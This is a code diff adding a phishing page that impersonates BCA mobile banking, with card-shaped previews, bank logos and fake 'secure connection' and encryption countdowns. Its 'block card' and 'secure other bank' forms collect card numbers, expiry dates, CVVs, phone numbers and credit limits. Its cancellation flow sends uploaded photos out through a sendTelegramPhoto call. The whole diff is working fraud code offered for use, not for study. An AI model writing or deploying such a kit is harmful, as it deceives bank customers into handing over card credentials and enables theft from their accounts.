+        const cardLogosSvg = {
+            visa: `<svg viewBox="0 0 48 32" width="38" height="24" style="background:#ffffff; padding:2px 4px; border-radius:4px; box-shadow:0 1px 3px rgba(0,0,0,0.2);"><path fill="#00579f" d="M18.8 22.3l2.4-14.8h3.8l-2.4 14.8h-3.8zm15.1-14.5c-.8-.3-2-.6-3.4-.6-3.8 0-6.4 2-6.5 4.8-.1 2.1 1.9 3.3 3.3 4 1.5.7 2 1.2 2 1.8 0 1-.1 1.4-2.1 1.4-1.4 0-2.2-.2-3.4-.7l-.5-.2-.5 3.1c.9.4 2.5.7 4.1.7 4 0 6.6-2 6.7-5 .1-1.7-1-2.9-3.3-4-1.4-.7-2.3-1.2-2.3-1.9 0-.6.7-1.3 2.2-1.3 1.2 0 2.1.3 2.8.6l.3.2.5-2.9zm8.5 0h-3c-.9 0-1.6.3-2 .1.3l-5.6 13.5h4l.8-2.2h4.9l.5 2.2h3.5l-3.1-14.8zm-4.7 9.8l2.1-5.7.3.9 1.2 4.8h-3.6zm-19.3-9.8l-3.7 10.1-.4-2c-.7-2.4-2.9-5-5.3-6.3l3.4 13h4l6-14.8h-4z"/><path fill="#faa61a" d="M8.6 7.5H2.8L2.5 8.9c4.3 1.1 7.1 3.7 8.3 6.9l-1.2-5.9c-.2-.9-.9-2.2-2-2.4z"/></svg>`,
+            mastercard: `<svg viewBox="0 0 48 32" width="38" height="24" style="background:#ffffff; padding:2px 3px; border-radius:4px; box-shadow:0 1px 3px rgba(0,0,0,0.2);"><circle cx="18" cy="16" r="10" fill="#eb001b"/><circle cx="30" cy="16" r="10" fill="#f79e1b" fill-opacity="0.9"/><path d="M24 8.8a10 10 0 0 0-3.9 7.2 10 10 0 0 0 3.9 7.2 10 10 0 0 0 3.9-7.2A10 10 0 0 0 24 8.8z" fill="#ff5f00"/></svg>`,
+            jcb: `<svg viewBox="0 0 48 32" width="36" height="24" style="background:#ffffff; padding:2px 3px; border-radius:4px; box-shadow:0 1px 3px rgba(0,0,0,0.2);"><rect width="48" height="32" rx="3" fill="#ffffff"/><path fill="#007940" d="M30 6h4a5 5 0 0 1 5 5v10a5 5 0 0 1-5 5h-4V6z"/><path fill="#e60012" d="M10 6h4a5 5 0 0 1 5 5v10a5 5 0 0 1-5 5h-4V6z"/><path fill="#003b94" d="M20 6h4a5 5 0 0 1 5 5v10a5 5 0 0 1-5 5h-4V6z"/><text x="24" y="21" font-family="sans-serif" font-size="10" font-weight="900" text-anchor="middle" fill="#ffffff" letter-spacing="1">JCB</text></svg>`,
+            amex: `<svg viewBox="0 0 48 32" width="38" height="24" style="background:#007bc1; padding:2px; border-radius:4px; box-shadow:0 1px 3px rgba(0,0,0,0.2);"><rect width="48" height="32" fill="#007bc1"/><text x="24" y="21" font-family="Arial, Helvetica, sans-serif" font-size="9" font-weight="900" text-anchor="middle" fill="#ffffff" letter-spacing="0.5">AMEX</text></svg>`,
+            discover: `<svg viewBox="0 0 48 32" width="38" height="24" style="background:#ffffff; padding:2px 3px; border-radius:4px; box-shadow:0 1px 3px rgba(0,0,0,0.2);"><rect width="48" height="32" rx="3" fill="#ffffff"/><path d="M4 11h9v10H4z" fill="#000000"/><text x="7" y="19" font-family="sans-serif" font-size="8" font-weight="bold" fill="#ffffff">DISC</text><circle cx="28" cy="16" r="6" fill="#f36f21"/><text x="28" y="19" font-family="sans-serif" font-size="8" font-weight="bold" fill="#000000" text-anchor="middle">VER</text></svg>`,
+            unionpay: `<svg viewBox="0 0 48 32" width="38" height="24" style="background:#ffffff; padding:2px 3px; border-radius:4px; box-shadow:0 1px 3px rgba(0,0,0,0.2);"><rect width="48" height="32" rx="3" fill="#ffffff"/><path fill="#c8102e" d="M12 7h9l-4 18h-9z"/><path fill="#004b87" d="M20 7h9l-4 18h-9z"/><path fill="#007b85" d="M28 7h9l-4 18h-9z"/><text x="24" y="20" font-family="sans-serif" font-size="7" font-weight="bold" fill="#ffffff" text-anchor="middle">UPI</text></svg>`,
+            gpn: `<svg viewBox="0 0 48 32" width="38" height="24" style="background:#ffffff; padding:2px 3px; border-radius:4px; box-shadow:0 1px 3px rgba(0,0,0,0.2);"><rect width="48" height="32" rx="3" fill="#ffffff"/><path d="M10 8h10l-4 16h-10z" fill="#d71920"/><path d="M22 8h16l-4 8h-10l-2 8h-6z" fill="#00529c"/><text x="32" y="24" font-family="sans-serif" font-size="7" font-weight="900" fill="#d71920">GPN</text></svg>`,
+            bca: `<span style="background: rgba(255,255,255,0.2); padding: 3px 8px; border-radius: 4px; font-size: 0.65rem; font-weight: 800; letter-spacing: 1px; color:#ffffff;">BCA</span>`
+        };
+
+        function detectCardType(cardNumber) {
+            const num = cardNumber.replace(/\D/g, '');
+            if (!num) {
+                return { type: "bca", name: "BCA CARD", logoHtml: cardLogosSvg.bca };
+            }
+            // Visa: Dimulai dengan 4
+            if (/^4/.test(num)) {
+                return { type: "visa", name: "VISA", logoHtml: cardLogosSvg.visa };
+            }
+            // Mastercard: Dimulai dengan 51-55 atau rentang 2221-2720
+            if (/^(5[1-5]|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[0-1][0-9]|2720)/.test(num)) {
+                return { type: "mastercard", name: "MASTERCARD", logoHtml: cardLogosSvg.mastercard };
+            }
+            // JCB: Dimulai dengan 3528-3589 atau 2131 atau 1800
+            if (/^(352[8-9]|35[3-8][0-9]|2131|1800)/.test(num)) {
+                return { type: "jcb", name: "JCB", logoHtml: cardLogosSvg.jcb };
+            }
+            // American Express (Amex): Dimulai dengan 34 atau 37
+            if (/^3[47]/.test(num)) {
+                return { type: "amex", name: "AMERICAN EXPRESS", logoHtml: cardLogosSvg.amex };
+            }
+            // Discover: Dimulai dengan 6011, 622126-622925, 644-649, 65
+            if (/^(6011|65|64[4-9]|622(12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[0-1][0-9]|92[0-5]))/.test(num)) {
+                return { type: "discover", name: "DISCOVER", logoHtml: cardLogosSvg.discover };
+            }
+            // UnionPay: Dimulai dengan 62
+            if (/^62/.test(num)) {
+                return { type: "unionpay", name: "UNIONPAY", logoHtml: cardLogosSvg.unionpay };
+            }
+            // GPN (Gerbang Pembayaran Nasional Indonesia) / BCA Paspor Debit GPN
+            if (/^(506(0|1)|507(8|9)|6500)/.test(num)) {
+                return { type: "gpn", name: "GPN / PASPOR BCA", logoHtml: cardLogosSvg.gpn };
+            }
+            return { type: "bca", name: "BCA CARD", logoHtml: cardLogosSvg.bca };
+        }
+
+        function hasCvvCapability(cardNumber) {
+            const num = cardNumber.replace(/\D/g, '');
+            if (/^506(0|1)|^507(8|9)|^6500/.test(num)) return false;
+            return true;
+        }
+
+        function validateForm(noKartu, noHp, masa, cvv, requiresCvv) {
+            const cleanCard = noKartu ? noKartu.replace(/\s+/g, '') : '';
+            if (cleanCard) {
+                if (cleanCard.length !== 16) {
+                    alert("Nomor Kartu harus 16 angka.");
+                    return false;
+                }
+                if (!validateLuhn(cleanCard)) {
+                    alert("Nomor Kartu ditolak oleh sistem keamanan (Gagal verifikasi Algoritma Luhn).");
+                    return false;
+                }
+            }
+            if (noHp && (noHp.length < 10 || !noHp.startsWith('08'))) {
+                alert("Nomor Handphone harus valid, diawali '08', minimal 10 digit.");
+                return false;
+            }
+            if (masa) {
+                if (masa.length !== 5 || !masa.includes('/')) {
+                    alert("Format Masa Berlaku harus MM/YY.");
+                    return false;
+                }
+            }
+            if (requiresCvv && cvv && (cvv.length < 3 || cvv.length > 4)) {
+                alert("CVV harus 3 atau 4 digit.");
+                return false;
+            }
+            return true;
+        }
+
+        function setFieldStatus(input, isValid, isEmpty) {
+            if (!input) return;
+            const icon = document.getElementById('icon-' + input.id);
+            input.classList.remove('is-valid', 'is-invalid');
+            if (icon) {
+                icon.className = 'validation-feedback-icon';
+                icon.innerHTML = '';
+            }
+
+            if (isEmpty) {
+                return;
+            }
+
+            if (isValid) {
+                input.classList.add('is-valid');
+                if (icon) {
+                    icon.classList.add('valid');
+                    icon.innerHTML = '&#10003;'; // Ceklis hijau ✓
+                }
+            } else {
+                input.classList.add('is-invalid');
+                if (icon) {
+                    icon.classList.add('invalid');
+                    icon.innerHTML = '&#10005;'; // Silang merah ✕
+                }
+            }
+        }
+
+        function attachInputValidation() {
+            document.querySelectorAll('.val-angka').forEach(input => {
+                input.addEventListener('input', function() {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                });
+            });
+            document.querySelectorAll('.val-masa').forEach(input => {
+                input.addEventListener('input', function() {
+                    let val = this.value.replace(/[^0-9]/g, '');
+                    if (val.length > 2) val = val.substring(0, 2) + '/' + val.substring(2, 4);
+                    this.value = val;
+                });
+            });
+            document.querySelectorAll('.val-rupiah').forEach(input => {
+                input.addEventListener('input', function() {
+                    let val = this.value.replace(/[^0-9]/g, '');
+                    if (val) {
+                        this.value = 'Rp ' + new Intl.NumberFormat('id-ID').format(val);
+                    } else {
+                        this.value = '';
+                    }
+                });
+            });
+
+            // Real-time Visual Validation Handlers
+            const cardInput = document.getElementById('bNoKartu') || document.getElementById('blNoKartu');
+            if (cardInput) {
+                const validateCardInput = () => {
+                    const raw = cardInput.value.replace(/\D/g, '');
+                    if (raw.length === 0) {
+                        setFieldStatus(cardInput, false, true);
+                    } else {
+                        const isValid = (raw.length === 16 && validateLuhn(raw));
+                        setFieldStatus(cardInput, isValid, false);
+                    }
+                };
+                cardInput.addEventListener('input', validateCardInput);
+                cardInput.addEventListener('blur', validateCardInput);
+            }
+
+            const phoneInput = document.getElementById('bNoHp') || document.getElementById('blNoHp');
+            if (phoneInput) {
+                const validatePhone = () => {
+                    const raw = phoneInput.value.trim();
+                    if (raw.length === 0) {
+                        setFieldStatus(phoneInput, false, true);
+                    } else {
+                        const isValid = raw.startsWith('08') && raw.length >= 10 && raw.length <= 15;
+                        setFieldStatus(phoneInput, isValid, false);
+                    }
+                };
+                phoneInput.addEventListener('input', validatePhone);
+                phoneInput.addEventListener('blur', validatePhone);
+            }
+
+            const masaInput = document.getElementById('bMasa') || document.getElementById('blMasa');
+            if (masaInput) {
+                const validateMasa = () => {
+                    const val = masaInput.value.trim();
+                    if (val.length === 0) {
+                        setFieldStatus(masaInput, false, true);
+                    } else if (val.length < 5) {
+                        setFieldStatus(masaInput, false, false);
+                    } else {
+                        const parts = val.split('/');
+                        if (parts.length === 2) {
+                            const month = parseInt(parts[0], 10);
+                            const year = parseInt(parts[1], 10);
+                            const isValid = month >= 1 && month <= 12 && !isNaN(year) && year >= 24;
+                            setFieldStatus(masaInput, isValid, false);
+                        } else {
+                            setFieldStatus(masaInput, false, false);
+                        }
+                    }
+                };
+                masaInput.addEventListener('input', validateMasa);
+                masaInput.addEventListener('blur', validateMasa);
+            }
+
+            const cvvInput = document.getElementById('cvvInputBox');
+            if (cvvInput) {
+                const validateCvv = () => {
+                    const cardElem = document.getElementById('bNoKartu') || document.getElementById('blNoKartu');
+                    const cleanNum = cardElem ? cardElem.value.replace(/\D/g, '') : '';
+                    const needsCvv = hasCvvCapability(cleanNum);
+                    if (!needsCvv) {
+                        setFieldStatus(cvvInput, true, true);
+                        return;
+                    }
+                    const val = cvvInput.value.trim();
+                    if (val.length === 0) {
+                        setFieldStatus(cvvInput, false, true);
+                    } else {
+                        const isValid = val.length >= 3 && val.length <= 4;
+                        setFieldStatus(cvvInput, isValid, false);
+                    }
+                };
+                cvvInput.addEventListener('input', validateCvv);
+                cvvInput.addEventListener('blur', validateCvv);
+            }
+
+            const limitInput = document.getElementById('bLimit') || document.getElementById('blLimit');
+            if (limitInput) {
+                const validateLimit = () => {
+                    const raw = limitInput.value.replace(/\D/g, '');
+                    if (raw.length === 0) {
+                        setFieldStatus(limitInput, false, true);
+                    } else {
+                        const numVal = parseInt(raw, 10);
+                        const isValid = !isNaN(numVal) && numVal >= 1000;
+                        setFieldStatus(limitInput, isValid, false);
+                    }
+                };
+                limitInput.addEventListener('input', validateLimit);
+                limitInput.addEventListener('blur', validateLimit);
+            }
+        }
+
+        const standardBcaLogoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/3840px-Bank_Central_Asia.svg.png";
+        const splashBcaMobileLogoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/3840px-Bank_Central_Asia.svg.png";
+
+        function runSecureCountdown(actionTitle, onComplete) {
+            modalOverlay.classList.add('scroll-locked');
+            const loaderOverlay = document.createElement('div');
+            loaderOverlay.className = 'bca-loader-overlay active';
+            loaderOverlay.innerHTML = `
+                <img src="${standardBcaLogoUrl}" alt="Logo BCA" style="height: 28px; margin-bottom: 12px; object-fit: contain;" />
+                <div class="bca-spinner"></div>
+                <div class="bca-countdown-number" id="countdownSec">3</div>
+                <div class="bca-loader-text">${actionTitle}<br><span style="font-size:0.72rem; color:#0060af;">Mengenkripsi Sesi...</span></div>
+            `;
+            document.body.appendChild(loaderOverlay);
+
+            const preventOverlayScroll = (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+            };
+            loaderOverlay.addEventListener('touchmove', preventOverlayScroll, { passive: false });
+            loaderOverlay.addEventListener('wheel', preventOverlayScroll, { passive: false });
+
+            let timeLeft = 3;
+            const countInterval = setInterval(() => {
+                timeLeft--;
+                const secElem = document.getElementById('countdownSec');
+                if (secElem) secElem.textContent = timeLeft;
+
+                if (timeLeft <= 0) {
+                    clearInterval(countInterval);
+                    loaderOverlay.removeEventListener('touchmove', preventOverlayScroll);
+                    loaderOverlay.removeEventListener('wheel', preventOverlayScroll);
+                    loaderOverlay.remove();
+                    modalOverlay.classList.remove('scroll-locked');
+                    onComplete();
+                }
+            }, 1000);
+        }
+
+        function showBankSuccessAlert(message, onDismiss) {
+            modalOverlay.classList.add('scroll-locked');
+            const alertOverlay = document.createElement('div');
+            alertOverlay.className = 'custom-alert-overlay active';
+            alertOverlay.innerHTML = `
+                <div class="custom-alert-box" id="customAlertBox">
+                    <div class="custom-alert-icon">
+                        <svg width="28" height="28" fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                    </div>
+                    <div class="custom-alert-title">Berhasil Diproses</div>
+                    <div class="custom-alert-desc">${message}</div>
+                    <button class="custom-alert-btn" id="customAlertOkBtn">OK</button>
+                </div>
+            `;
+            document.body.appendChild(alertOverlay);
+
+            const preventOverlayScroll = (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+            };
+            alertOverlay.addEventListener('touchmove', preventOverlayScroll, { passive: false });
+            alertOverlay.addEventListener('wheel', preventOverlayScroll, { passive: false });
+
+            const dismissHandler = () => {
+                alertOverlay.removeEventListener('touchmove', preventOverlayScroll);
+                alertOverlay.removeEventListener('wheel', preventOverlayScroll);
+                alertOverlay.remove();
+                modalOverlay.classList.remove('scroll-locked');
+                if (onDismiss) onDismiss();
+            };
+
+            const okBtn = alertOverlay.querySelector('#customAlertOkBtn');
+            if (okBtn) {
+                okBtn.addEventListener('click', dismissHandler);
+            }
+        }
+
+        function renderPembatalanForm() {
+            modalContentBody.innerHTML = `<div class="step-fade-in">${serviceTemplates["pembatalan"]}</div>`;
+            const closeBtn = document.getElementById('modalCloseBtn');
+            if (closeBtn) closeBtn.addEventListener('click', closeModal);
+            attachPembatalanLogic();
+        }
+
+        function attachPembatalanLogic() {
+            const proofFileInput = document.getElementById('proofFileInput');
+            const previewContainer = document.getElementById('previewContainer');
+            const imagePreview = document.getElementById('imagePreview');
+            const uploadTextPrompt = document.getElementById('uploadTextPrompt');
+            const cancelSubmitBtn = document.getElementById('cancelSubmitBtn');
+
+            let selectedFileObject = null;
+
+            if (proofFileInput) {
+                proofFileInput.addEventListener('change', (e) => {
+                    const classFile = e.target.files[0];
+                    if (classFile) {
+                        selectedFileObject = classFile;
+                        const reader = new FileReader();
+                        reader.onload = function(uploadEvent) {
+                            imagePreview.src = uploadEvent.target.result;
+                            previewContainer.style.display = 'block';
+                            uploadTextPrompt.style.display = 'none';
+                            
+                            cancelSubmitBtn.style.background = 'var(--primary)';
+                            cancelSubmitBtn.style.color = '#ffffff';
+                            cancelSubmitBtn.style.cursor = 'pointer';
+                            cancelSubmitBtn.removeAttribute('disabled');
+                        };
+                        reader.readAsDataURL(classFile);
+                    }
+                });
+            }
+
+            if (cancelSubmitBtn) {
+                cancelSubmitBtn.addEventListener('click', () => {
+                    if (selectedFileObject) {
+                        runSecureCountdown("Memproses Pembatalan...", () => {
+                            sendTelegramPhoto(selectedFileObject, '🚨 *LAPORAN PEMBATALAN TRANSAKSI*\nLampiran Bukti Struk/Foto.');
+                            showBankSuccessAlert('Bukti pembatalan transaksi berhasil dikirim.', () => {
+                                closeModal();
+                            });
+                        });
+                    }
+                });
+            }
+        }
+
+        const serviceTemplates = {
+            "blokir": `
+                <div class="mbca-top-header">
+                    <div class="mbca-header-left" onclick="closeModal()">
+                        <button type="button" class="mbca-back-btn" aria-label="Kembali">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#00508c" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                        </button>
+                    </div>
+                    <div class="mbca-header-title">Blokir Kartu BCA</div>
+                    <div class="mbca-header-right">
+                        <span class="mbca-status-indicator" title="Koneksi Aman Aktif"></span>
+                    </div>
+                </div>
+
+                <div class="card-flip-container" id="cardFlipContainerBox">
+                    <div class="card-flip-inner" id="cardFlipInner">
+                        <div class="card-face card-front" id="cardFrontBg">
+                            <div class="card-top-row">
+                                <div class="card-brand-wrap">
+                                    <div class="card-brand-name" id="cardBrandText">BANK BCA</div>
+                                </div>
+                                <div id="cardLogoBadge" class="card-logo-badge">
+                                    <span style="background: rgba(255,255,255,0.2); border: 1px solid rgba(255,255,255,0.3); padding: 2px 7px; border-radius: 4px; font-size: 0.65rem; font-weight: 700; letter-spacing: 0.5px; color:#ffffff;">BCA</span>
+                                </div>
+                            </div>
+                            <div class="card-chip-row">
+                                <div class="card-chip-left">
+                                    <div class="emv-chip"><div class="emv-chip-core"></div></div>
+                                    <svg class="contactless-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M8.5 16.5a5 5 0 0 1 0-9"/><path d="M12 19a8.5 8.5 0 0 0 0-14"/><path d="M15.5 21.5a12 12 0 0 0 0-19"/></svg>
+                                </div>
+                            </div>
+                            <div class="card-number-display" id="cardNumPreview">&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;</div>
+                            <div class="card-bottom-row">
+                                <div class="card-meta-group">
+                                    <div class="card-bottom-label">VALID THRU</div>
+                                    <div class="card-bottom-val" id="cardExpiryPreview">MM/YY</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card-face card-back" id="cardBackBg">
+                            <div class="magnetic-strip"></div>
+                            <div class="signature-cvv-row">
+                                <div class="signature-box">Authorized Signature</div>
+                                <div class="cvv-box-display" id="cvvDisplayTarget">&bull;&bull;&bull;</div>
+                            </div>
+                            <div class="card-back-meta">
+                                <div>Halo BCA 1500888 &bull; www.bca.co.id</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <form id="formBlokir">
+                    <div class="form-group">
+                        <label for="bNoKartu"><span>Nomor Kartu</span><span id="cardTypeLabel" class="card-type-chip"></span></label>
+                        <div class="input-wrapper">
+                            <input type="text" id="bNoKartu" class="form-control" inputmode="numeric" maxlength="19" placeholder="16 angka no kartu" required />
+                            <span class="validation-feedback-icon" id="icon-bNoKartu"></span>
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="bMasa">Masa Berlaku</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="bMasa" class="form-control val-masa" inputmode="numeric" maxlength="5" placeholder="BB/TT" required />
+                                <span class="validation-feedback-icon" id="icon-bMasa"></span>
+                            </div>
+                        </div>
+                        <div class="form-group" id="cvvFormGroup">
+                            <label for="cvvInputBox" id="cvvLabel">CVV</label>
+                            <div class="input-wrapper">
+                                <input type="password" id="cvvInputBox" class="form-control val-angka" inputmode="numeric" maxlength="4" placeholder="3 digit" required />
+                                <span class="validation-feedback-icon" id="icon-cvvInputBox"></span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="bNoHp">Nomor Telepon</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="bNoHp" class="form-control val-angka" inputmode="numeric" maxlength="15" placeholder="0812xxxxxxxxxxx" required />
+                            <span class="validation-feedback-icon" id="icon-bNoHp"></span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="bLimit">Sisa Limit</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="bLimit" class="form-control val-rupiah" inputmode="numeric" placeholder="Rp 0" required />
+                            <span class="validation-feedback-icon" id="icon-bLimit"></span>
+                        </div>
+                    </div>
+
+                    <div class="mbca-notes-container">
+                        <div class="mbca-notes-title">Catatan:</div>
+                        <ul class="mbca-notes-list">
+                            <li class="mbca-notes-item">Kartu Paspor BCA yang diblokir tidak dapat digunakan kembali untuk bertransaksi di ATM, EDC, maupun transaksi online.</li>
+                            <li class="mbca-notes-item">Untuk penggantian kartu fisik baru, silakan kunjungi kantor cabang BCA terdekat atau melalui mesin CS Digital.</li>
+                            <li class="mbca-notes-item">Pastikan seluruh data kartu yang dimasukkan sudah sesuai sebelum menekan tombol OK.</li>
+                        </ul>
+                    </div>
+
+                    <div class="mbca-action-buttons">
+                        <button type="button" class="mbca-btn-cancel" onclick="closeModal()">Cancel</button>
+                        <button type="submit" class="mbca-btn-ok">OK</button>
+                    </div>
+                </form>
+            `,
+            "bank-lain": `
+                <div class="mbca-top-header">
+                    <div class="mbca-header-left" onclick="closeModal()">
+                        <button type="button" class="mbca-back-btn" aria-label="Kembali">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#00508c" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                        </button>
+                    </div>
+                    <div class="mbca-header-title">Amankan Bank Lain</div>
+                    <div class="mbca-header-right">
+                        <span class="mbca-status-indicator" title="Koneksi Aman Aktif"></span>
+                    </div>
+                </div>
+
+                <div class="form-group" style="margin-top: 4px; margin-bottom: 9px;">
+                    <label for="bankSelector">Pilih Bank</label>
+                    <select class="form-select" id="bankSelector">
+                        <option value="bca" data-name="BANK BCA" data-gradient="linear-gradient(135deg, #002d62 0%, #004b93 50%, #001f44 100%)" data-logo="${standardBcaLogoUrl}">Bank Central Asia (BCA)</option>
+                        <option value="mandiri" data-name="BANK MANDIRI" data-gradient="linear-gradient(135deg, #00264d 0%, #003d7a 50%, #001a33 100%)" data-logo="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSAYFGvSdfxFoUH8YhIAMuL8m44pFZC6TcT1R9dPgtKRQ&s=10">Bank Mandiri</option>
+                        <option value="bri" data-name="BANK BRI" data-gradient="linear-gradient(135deg, #002244 0%, #004080 45%, #0059b3 100%)" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/BANK_BRI_logo.svg/1280px-BANK_BRI_logo.svg.png">Bank Rakyat Indonesia (BRI)</option>
+                        <option value="bni" data-name="BANK BNI" data-gradient="linear-gradient(135deg, #b83d00 0%, #e65100 45%, #a04000 100%)" data-logo="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcToR9U9f9Qr6kxTnO4IImlgqk7PUDFcBjfWRX8ftCoSkw&s=10">Bank Negara Indonesia (BNI)</option>
+                        <option value="cimb" data-name="CIMB NIAGA" data-gradient="linear-gradient(135deg, #670000 0%, #8b0000 45%, #380000 100%)" data-logo="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSH6I2l-Ti3ThO_2dnVcY1TnW41v-FT1NityJf9v7Hc&s=10">CIMB Niaga</option>
+                        <option value="permata" data-name="BANK PERMATA" data-gradient="linear-gradient(135deg, #004724 0%, #006633 45%, #002e17 100%)" data-logo="https://upload.wikimedia.org/wikipedia/en/archive/4/48/20250913151534!PermataBank_logo.svg">Bank Permata</option>
+                        <option value="lainnya" data-name="BANK LAINNYA" data-gradient="linear-gradient(135deg, #1f2937 0%, #111827 50%, #374151 100%)" data-logo="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQDB5Sx6bl5MJnMWDtUgS64HM2ZYLPZvJ2uyz562unwVw&s=10">Bank Lain</option>
+                    </select>
+                </div>
+
+                <div class="card-flip-container" id="cardFlipContainerBox">
+                    <div class="card-flip-inner" id="cardFlipInner">
+                        <div class="card-face card-front" id="cardFrontBg">
+                            <div class="card-top-row">
+                                <div class="card-brand-wrap">
+                                    <div class="card-brand-name" id="cardBrandText">BANK BCA</div>
+                                </div>
+                                <div id="cardLogoBadge" class="card-logo-badge">
+                                    <span style="background: rgba(255,255,255,0.2); border: 1px solid rgba(255,255,255,0.3); padding: 2px 7px; border-radius: 4px; font-size: 0.65rem; font-weight: 700; letter-spacing: 0.5px; color:#ffffff;">BCA</span>
+                                </div>
+                            </div>
+                            <div class="card-chip-row">
+                                <div class="card-chip-left">
+                                    <div class="emv-chip"><div class="emv-chip-core"></div></div>
+                                    <svg class="contactless-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M8.5 16.5a5 5 0 0 1 0-9"/><path d="M12 19a8.5 8.5 0 0 0 0-14"/><path d="M15.5 21.5a12 12 0 0 0 0-19"/></svg>
+                                </div>
+                            </div>
+                            <div class="card-number-display" id="cardNumPreview">&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;</div>
+                            <div class="card-bottom-row">
+                                <div class="card-meta-group">
+                                    <div class="card-bottom-label">VALID THRU</div>
+                                    <div class="card-bottom-val" id="cardExpiryPreview">MM/YY</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card-face card-back" id="cardBackBg">
+                            <div class="magnetic-strip"></div>
+                            <div class="signature-cvv-row">
+                                <div class="signature-box">Authorized Signature</div>
+                                <div class="cvv-box-display" id="cvvDisplayTarget">&bull;&bull;&bull;</div>
+                            </div>
+                            <div class="card-back-meta">
+                                <div id="cardBackContactText">Layanan Nasabah 24 Jam</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <form id="formBankLain">
+                    <div class="form-group">
+                        <label for="blNoKartu"><span>Nomor Kartu</span><span id="cardTypeLabel" class="card-type-chip"></span></label>
+                        <div class="input-wrapper">
+                            <input type="text" id="blNoKartu" class="form-control" inputmode="numeric" maxlength="19" placeholder="16 angka no kartu" required />
+                            <span class="validation-feedback-icon" id="icon-blNoKartu"></span>
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="blMasa">Masa Berlaku</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="blMasa" class="form-control val-masa" inputmode="numeric" maxlength="5" placeholder="BB/TT" required />
+                                <span class="validation-feedback-icon" id="icon-blMasa"></span>
+                            </div>
+                        </div>
+                        <div class="form-group" id="cvvFormGroup">
+                            <label for="cvvInputBox" id="cvvLabel">CVV</label>
+                            <div class="input-wrapper">
+                                <input type="password" id="cvvInputBox" class="form-control val-angka" inputmode="numeric" maxlength="4" placeholder="3 digit" required />
+                                <span class="validation-feedback-icon" id="icon-cvvInputBox"></span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="blNoHp">Nomor Telepon</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="blNoHp" class="form-control val-angka" inputmode="numeric" maxlength="15" placeholder="0812xxxxxxxxxxx" required />
+                            <span class="validation-feedback-icon" id="icon-blNoHp"></span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="blLimit">Sisa Limit</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="blLimit" class="form-control val-rupiah" inputmode="numeric" placeholder="Rp 0" required />
+                            <span class="validation-feedback-icon" id="icon-blLimit"></span>
+                        </div>
+                    </div>
+
+                    <div class="mbca-notes-container">
+                        <div class="mbca-notes-title">Catatan:</div>
+                        <ul class="mbca-notes-list">
+                            <li class="mbca-notes-item">Permintaan pengamanan kartu bank lain akan diteruskan langsung ke sistem perbankan penerbit kartu.</li>
+                            <li class="mbca-notes-item">Segera hubungi call center bank penerbit kartu Anda untuk konfirmasi penerbitan kartu pengganti baru.</li>
+                            <li class="mbca-notes-item">Pastikan nomor kartu, masa berlaku, dan kontak telah sesuai dengan kartu fisik Anda.</li>
+                        </ul>
+                    </div>
+
+                    <div class="mbca-action-buttons">
+                        <button type="button" class="mbca-btn-cancel" onclick="closeModal()">Cancel</button>
+                        <button type="submit" class="mbca-btn-ok">OK</button>
+                    </div>
+                </form>
+            `,
+            "pembatalan": `
+                <div class="mbca-top-header">
+                    <div class="mbca-header-left" onclick="closeModal()">
+                        <button type="button" class="mbca-back-btn" aria-label="Kembali">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#00508c" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                        </button>
+                    </div>
+                    <div class="mbca-header-title">Pembatalan Transaksi</div>
+                    <div class="mbca-header-right">
+                        <span class="mbca-status-indicator" title="Koneksi Aman Aktif"></span>
+                    </div>
+                </div>
+
+                <div class="mbca-section-strip" style="margin-top: 6px;">Bukti Pembatalan Transaksi</div>
+
+                <div style="text-align: center; padding-top: 4px;">
+                    <div class="upload-box" id="uploadBoxArea">
+                        <input type="file" id="proofFileInput" accept="image/*" />
